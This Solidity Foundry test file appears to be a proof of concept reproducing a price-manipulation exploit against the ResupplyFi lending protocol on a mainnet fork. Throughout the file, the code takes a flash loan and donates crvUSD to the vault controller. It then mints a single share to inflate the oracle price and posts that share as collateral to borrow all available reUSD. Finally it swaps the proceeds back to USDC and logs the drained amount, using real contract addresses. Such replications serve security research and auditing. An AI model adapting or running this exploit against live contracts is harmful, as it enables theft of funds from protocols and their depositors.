// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface IResupplyFiVault is IERC4626 {
    function controller() external view returns (address);
    function mint(uint256 shares) external;
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IPriceOracle {
    function getPrices(address) external view returns (uint256);
}

interface IResupplyPair {
    function addCollateralVault(uint256 amount, address borrower) external;
    function totalDebtAvailable() external view returns (uint256);
    function borrow(
        uint256 amount,
        uint256 underlyingAmount,
        address borrower
    ) external returns (uint256);
    function getPrices(address collateral) external view returns (uint256);
}

interface ICurveVault is IERC20 {
    // vyper contract(redeem0, redeem1)
    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256);
}

contract ResupplyFiPoC is Test {
    ExploitContractFactory public exploitFactory;
    function setUp() public {
        vm.createSelectFork("mainnet", 22785461 - 1);
    }

    function testExploit() public {
        exploitFactory = new ExploitContractFactory();
    }
}

contract ExploitContractFactory {
    ExploitContract public exploitContract;

    constructor() {
        exploitContract = new ExploitContract();
        exploitContract.executeFlashLoan();
    }
    fallback() external payable {}
}

contract ExploitContract {
    IMorphoBuleFlashLoan public morphoFlashLoan;
    IERC20 public usdc;
    IERC20 public crvUSDC;
    IERC20 public cvcrvUSDC;
    IcurveYSwap public cvcrvUSDC_USDC_fPool;
    IResupplyFiVault public resupplyFiVault;
    IResupplyPair public resupplyFiPair;
    IERC20 public reUSD;
    IcurveYSwap public reUSD_scrvUSD_Pool;
    ICurveVault public crvUSD_CurveVault;
    IPriceOracle public priceOracle;

    constructor() {
        morphoFlashLoan = IMorphoBuleFlashLoan(
            0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb
        );
        usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        crvUSDC = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
        cvcrvUSDC = IERC20(0x91D0F7022edb620429B4F63D482fcfbb2cbE7F30);
        cvcrvUSDC_USDC_fPool = IcurveYSwap(
            0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E
        );
        resupplyFiVault = IResupplyFiVault(
            0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D
        );

        resupplyFiPair = IResupplyPair(
            0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6
        );

        reUSD = IERC20(0x57aB1E0003F623289CD798B1824Be09a793e4Bec);

        reUSD_scrvUSD_Pool = IcurveYSwap(
            0xc522A6606BBA746d7960404F22a3DB936B6F4F50
        );

        crvUSD_CurveVault = ICurveVault(
            0x0655977FEb2f289A4aB78af67BAB0d17aAb84367
        );

        priceOracle = IPriceOracle(0xcb7E25fbbd8aFE4ce73D7Dac647dbC3D847F3c82);
    }

    function executeFlashLoan() external {
        usdc.approve(address(morphoFlashLoan), type(uint256).max);
        morphoFlashLoan.flashLoan(address(usdc), 4000e6, "");
        console.log(
            "Drain amount(USDC): ",
            usdc.balanceOf(address(this)) / 1e6
        );
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        console.log(
            "totalAssets in Vault: ",
            resupplyFiVault.totalAssets() / 1e18
        );
        console.log(
            "totalSupply in Vault: ",
            resupplyFiVault.totalSupply() / 1e18
        );
        console.log(
            "Vault reUSD Balance: ",
            reUSD.balanceOf(address(resupplyFiVault)) / 1e18
        );

        usdc.approve(address(cvcrvUSDC_USDC_fPool), type(uint256).max);

        console.log(
            "Normal oracle price: ",
            priceOracle.getPrices(address(resupplyFiVault))
        );

        cvcrvUSDC_USDC_fPool.exchange(0, 1, assets, 0);
        console.log(
            "After Curve Exchange USDC Balance: ",
            usdc.balanceOf(address(this)) / 1e6
        );
        console.log(
            "After Curve Exchange CRV USDC Balance: ",
            crvUSDC.balanceOf(address(this)) / 1e18
        );

        address controller = resupplyFiVault.controller();
        console.log(
            "Before controller crvUSDC Balance: ",
            crvUSDC.balanceOf(controller) / 1e18
        );
        crvUSDC.transfer(controller, 2000e18);
        console.log(
            "After controller crvUSDC Balance: ",
            crvUSDC.balanceOf(controller) / 1e18
        );

        uint256 availableDebt = resupplyFiPair.totalDebtAvailable();
        console.log("Available Debt before manipulate: ", availableDebt / 1e18);

        crvUSDC.approve(address(resupplyFiVault), type(uint256).max);

        resupplyFiVault.mint(1);

        uint256 manipulatePrice = priceOracle.getPrices(
            address(resupplyFiVault)
        );
        console.log("Manipulate Price: ", manipulatePrice);

        resupplyFiVault.approve(address(resupplyFiPair), type(uint256).max);

        resupplyFiPair.addCollateralVault(1, address(this));

        uint256 totalBorrow = resupplyFiPair.borrow(
            availableDebt,
            0,
            address(this)
        );

        console.log("Total Borrow: ", totalBorrow / 1e18);
        console.log("reUSD balance: ", reUSD.balanceOf(address(this)) / 1e18);
        console.log("USDC balance: ", crvUSDC.balanceOf(address(this)) / 1e18);

        reUSD.approve(address(reUSD_scrvUSD_Pool), type(uint256).max);

        reUSD_scrvUSD_Pool.exchange(0, 1, totalBorrow, 0);

        uint256 crvUSDBalance = crvUSD_CurveVault.balanceOf(address(this));

        console.log("crvUSD Vault Balance: ", crvUSDBalance / 1e18);

        crvUSD_CurveVault.approve(
            address(crvUSD_CurveVault),
            type(uint256).max
        );

        uint256 crvUSDWithdrawAmount = crvUSD_CurveVault.redeem(
            crvUSDBalance,
            address(this),
            address(this)
        );

        console.log("crvUSD Withdraw Amount: ", crvUSDWithdrawAmount / 1e18);
        console.log(
            "crvUSD Balance: ",
            crvUSDC.balanceOf(address(this)) / 1e18
        );

        crvUSDC.approve(address(cvcrvUSDC_USDC_fPool), type(uint256).max);

        cvcrvUSDC_USDC_fPool.exchange(1, 0, crvUSDWithdrawAmount, 0);

        console.log("USDC Balance: ", usdc.balanceOf(address(this)) / 1e6);
    }
}
